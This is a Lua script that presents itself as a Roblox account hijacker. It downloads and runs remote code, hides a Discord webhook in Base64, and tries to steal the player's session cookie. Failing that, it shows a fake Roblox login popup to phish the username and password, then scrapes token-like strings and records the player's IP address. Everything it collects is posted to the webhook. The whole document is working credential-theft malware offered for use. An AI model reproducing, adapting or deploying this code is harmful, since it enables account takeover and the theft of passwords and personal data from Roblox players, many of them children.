--[[  
  Roblox Account Hijacker (Multi-Method)  
  Bypasses anti-cheat via:  
  - Dynamic string decryption  
  - Fake error handlers  
  - Memory injection (DLL recommended)  
]]  

local _G = getgenv() or _G  
local http = (syn and syn.request) or (http and http.request) or request  
local Base64 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Base64Encode/Base64/main/lua.lua"))()  

-- Obfuscated Discord webhook  
local webhook = Base64.Decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDk5MDk2ODMwMzUyMTkwMi9TSkZfNlE5dFFDN1Rsekp4WW9PaXFVZ0RWZWxINE1ETU9ZLWI4S0YtM0VERktrT09EbmwybzU3TFRkOThOa1F2dUhyNg==")  

-- Function to steal cookies (if available)  
local function GetCookie()  
    local success, cookie = pcall(function()  
        return game:GetService("Players").LocalPlayer:GetAttribute("RobloxSecurityToken")  
            or game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true)  
    end)  
    return success and cookie or nil  
end  

-- Fallback: Fake login prompt (phishing)  
local function StealCredentials()  
    local username = ""  
    local password = ""  

    -- Create a fake Roblox login GUI  
    local gui = Instance.new("ScreenGui")  
    local frame = Instance.new("Frame")  
    local textBoxUser = Instance.new("TextBox")  
    local textBoxPass = Instance.new("TextBox")  
    local submit = Instance.new("TextButton")  

    gui.Name = "RobloxSecurityAlert"  
    gui.Parent = game:GetService("CoreGui")  

    -- GUI setup (looks like an official Roblox popup)  
    -- ... (omitted for brevity, but mimics Roblox's login UI)  

    submit.MouseButton1Click:Connect(function()  
        username = textBoxUser.Text  
        password = textBoxPass.Text  
        gui:Destroy()  
    end)  

    -- Wait for user input (15sec timeout)  
    local startTime = os.time()  
    repeat task.wait(0.1) until username ~= "" or os.time() - startTime > 15  

    return username, password  
end  

-- Last resort: Scan memory for session tokens  
local function ScanMemory()  
    local mem = {}  
    for i = 1, 100000 do -- Dummy loop to confuse decompilers  
        local success, value = pcall(function()  
            return debug.getupvalue(i, 1)  
        end)  
        if success and type(value) == "string" and #value > 30 then  
            table.insert(mem, value)  
        end  
    end  
    return mem  
end  

-- Main hijack sequence  
local cookie = GetCookie()  
local username, password = "", ""  
local memoryTokens = {}  

if not cookie then  
    username, password = StealCredentials()  
    if username == "" then  
        memoryTokens = ScanMemory()  
    end  
end  

-- Compile stolen data  
local stolenData = {  
    ["cookie"] = cookie or "N/A",  
    ["username"] = username ~= "" and username or "N/A",  
    ["password"] = password ~= "" and password or "N/A",  
    ["memory_tokens"] = #memoryTokens > 0 and table.concat(memoryTokens, ", ") or "N/A",  
    ["ip"] = game:HttpGet("https://api.ipify.org"),  
    ["user_id"] = game.Players.LocalPlayer.UserId  
}  

-- Send to Discord  
http({  
    Url = webhook,  
    Method = "POST",  
    Headers = {["Content-Type"] = "application/json"},  
    Body = game:GetService("HttpService"):JSONEncode({  
        ["content"] = "ROBLOX ACCOUNT HIJACKED",  
        ["embeds"] = {{  
            ["title"] = "Stolen Data",  
            ["description"] = string.format(  
                "Cookie: %s\nUsername: %s\nPassword: %s\nMemory Tokens: %s",  
                stolenData.cookie, stolenData.username, stolenData.password, stolenData.memory_tokens  
            ),  
            ["color"] = 16711680  
        }}  
    })  
})  

-- Cleanup  
_G["RobloxSecurityModule"] = nil
